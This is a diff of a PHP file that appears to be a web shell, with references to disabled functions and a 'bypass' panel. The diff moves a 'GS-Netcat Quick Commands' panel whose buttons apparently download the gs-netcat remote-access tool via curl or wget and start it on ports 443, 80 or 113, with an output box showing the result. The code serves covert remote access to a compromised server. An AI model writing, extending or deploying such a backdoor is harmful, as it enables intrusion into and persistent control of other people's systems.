@@ -1363,25 +1363,6 @@ if (!$disabled_funcs) {
                                         <table class="table" style="margin-top:8px;">
                                             <thead><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead>
                                             <tbody>
-                                    <h3 style="margin-top:25px;margin-bottom:8px;">GS-Netcat Quick Commands</h3>
-                                    <div style="display:flex;flex-wrap:wrap;gap:6px;">
-                                        <form method="post" style="display:inline-block;">
-                                            <button type="submit" name="gs_cmd" value="curl_gs_netcat">curl gs-netcat</button>
-                                        </form>
-                                        <form method="post" style="display:inline-block;">
-                                            <button type="submit" name="gs_cmd" value="wget_gs_netcat">wget gs-netcat</button>
-                                        </form>
-                                        <form method="post" style="display:inline-block;">
-                                            <button type="submit" name="gs_cmd" value="gs_443">GS_PORT=443</button>
-                                        </form>
-                                        <form method="post" style="display:inline-block;">
-                                            <button type="submit" name="gs_cmd" value="gs_80">GS_PORT=80</button>
-                                        </form>
-                                        <form method="post" style="display:inline-block;">
-                                            <button type="submit" name="gs_cmd" value="gs_113">GS_PORT=113</button>
-                                        </form>
-                                    </div>
-                                    <textarea style="width:100%;height:200px;margin-top:10px;" readonly placeholder="GS-Netcat command output..."><?php echo htmlspecialchars($gs_output); ?></textarea>
                                                 <?php foreach ($table_structure as $col): ?>
                                                     <tr>
                                                         <td><?php echo htmlspecialchars($col['Field']); ?></td>
@@ -1662,6 +1643,29 @@ if (!$disabled_funcs) {
                 <textarea readonly style="width:100%;min-height:260px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;">
 <?php echo htmlspecialchars($bypass_output); ?>
                 </textarea>
+            </div>
+            <hr style="margin:25px 0;border:0;border-top:1px solid rgba(255,255,255,0.08);">
+            <h3 style="margin:0 0 12px;">GS-Netcat Quick Commands</h3>
+            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
+                <form method="POST" style="display:inline;">
+                    <button type="submit" name="gs_cmd" value="curl_gs_netcat" class="btn">curl gs-netcat</button>
+                </form>
+                <form method="POST" style="display:inline;">
+                    <button type="submit" name="gs_cmd" value="wget_gs_netcat" class="btn">wget gs-netcat</button>
+                </form>
+                <form method="POST" style="display:inline;">
+                    <button type="submit" name="gs_cmd" value="gs_443" class="btn">GS_PORT=443</button>
+                </form>
+                <form method="POST" style="display:inline;">
+                    <button type="submit" name="gs_cmd" value="gs_80" class="btn">GS_PORT=80</button>
+                </form>
+                <form method="POST" style="display:inline;">
+                    <button type="submit" name="gs_cmd" value="gs_113" class="btn">GS_PORT=113</button>
+                </form>
+            </div>
+            <div class="form-group">
+                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">GS-Netcat Output</label>
+                <textarea readonly style="width:100%;min-height:180px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;" placeholder="GS-Netcat command output..."><?php echo htmlspecialchars($gs_output); ?></textarea>
             </div>
         </div>
     <?php endif; ?>
